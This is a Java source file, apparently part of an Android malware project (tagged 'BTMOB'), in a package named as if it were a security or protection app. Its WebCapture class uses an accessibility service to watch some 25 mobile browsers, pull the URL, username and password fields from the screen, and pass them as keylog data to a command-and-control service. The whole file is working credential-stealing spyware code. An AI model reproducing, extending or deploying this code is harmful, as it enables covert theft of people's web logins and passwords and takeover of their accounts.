package com.seguranca.protecao;

import android.content.Context;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

/** [KRYPTOS-PATCH BTMOB] Captura de URL y campos de login en navegadores. */
public class WebCapture {

    private static final String[] BROWSERS = {
        "com.android.chrome", "com.chrome.beta", "com.chrome.dev", "com.chrome.canary",
        "org.mozilla.firefox", "org.mozilla.firefox_beta", "org.mozilla.focus",
        "com.brave.browser", "com.duckduckgo.mobile.android", "com.microsoft.emmx",
        "com.opera.browser", "com.opera.mini.native", "com.sec.android.app.sbrowser",
        "com.android.browser", "mobi.mgeek.TunnyBrowser", "com.miui.browser",
        "com.coloros.browser", "com.huawei.browser", "com.oplus.browser",
        "com.vivo.browser", "com.UCMobile.intl", "com.uc.browser.en",
        "com.yandex.browser", "com.kiwibrowser.browser", "com.ecosia.android"
    };

    private static final String[] URL_SUFFIX = {
        "url_bar", "url_field", "omnibarTextInput", "location_bar_edit_text",
        "search_input", "address_bar", "edit_url", "browser_url", "url"
    };

    private static final String[] USER_SUFFIX = {
        "username", "user_name", "email", "login_username", "login"
    };

    private static long lastCapture = 0L;
    private static String curUrl = "", curUser = "", curPwd = "";
    private static String sentUrl = "", sentUser = "", sentPwd = "";
    private static String lastPkg = "";

    public static boolean isBrowser(String pkg) {
        if (pkg == null) return false;
        for (String b : BROWSERS) { if (pkg.startsWith(b)) return true; }
        return false;
    }

    private static String shortName(String pkg) {
        int i = pkg.lastIndexOf(46);
        return i > 0 ? pkg.substring(i + 1) : pkg;
    }

    public static void onEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();
        if (!isBrowser(pkg)) return;

        long now = System.currentTimeMillis();
        if (now - lastCapture < 700L) return;
        lastCapture = now;

        try {
            UiAssistBridge svc = UiAssistBridge.instance;
            if (svc == null) return;
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            if (root == null) return;
            if (!pkg.equals(lastPkg)) { lastPkg = pkg; sentUrl = ""; sentUser = ""; sentPwd = ""; }
            curUrl = ""; curUser = ""; curPwd = "";
            scan(root, 0);
            Context ctx = svc.getApplicationContext();
            if (!curUrl.isEmpty() && !curUrl.equals(sentUrl)) {
                sentUrl = curUrl;
                CommandControlService.sendKeylogData(ctx, "[WEB] " + shortName(pkg) + " -> " + curUrl);
            }
            if ((!curUser.isEmpty() || !curPwd.isEmpty())
                    && (!curUser.equals(sentUser) || !curPwd.equals(sentPwd))) {
                sentUser = curUser; sentPwd = curPwd;
                CommandControlService.sendKeylogData(ctx, "[WEB-LOGIN] " + shortName(pkg)
                        + " | user=" + curUser + " | pass=" + curPwd);
            }
        } catch (Throwable ignored) {}
    }

    private static void scan(AccessibilityNodeInfo n, int depth) {
        if (n == null || depth > 30) return;
        String vid = null;
        try { vid = n.getViewIdResourceName(); } catch (Throwable ignored) {}
        if (vid != null) {
            String v = vid.toLowerCase();
            String txt = null;
            try { CharSequence t = n.getText(); if (t != null) txt = t.toString().trim(); } catch (Throwable ignored) {}
            boolean pwd = false;
            try { pwd = n.isPassword(); } catch (Throwable ignored) {}
            if (txt != null && !txt.isEmpty() && txt.length() < 400) {
                if (curUrl.isEmpty()) {
                    for (String s : URL_SUFFIX) { if (v.endsWith(s)) { curUrl = txt; break; } }
                }
                if (curUser.isEmpty()) {
                    for (String s : USER_SUFFIX) { if (v.endsWith(s)) { curUser = txt; break; } }
                }
                if (curPwd.isEmpty() && pwd) { curPwd = txt; }
            }
        }
        int c = 0;
        try { c = n.getChildCount(); } catch (Throwable ignored) {}
        for (int i = 0; i < c; i++) {
            try { scan(n.getChild(i), depth + 1); } catch (Throwable ignored) {}
        }
    }
}
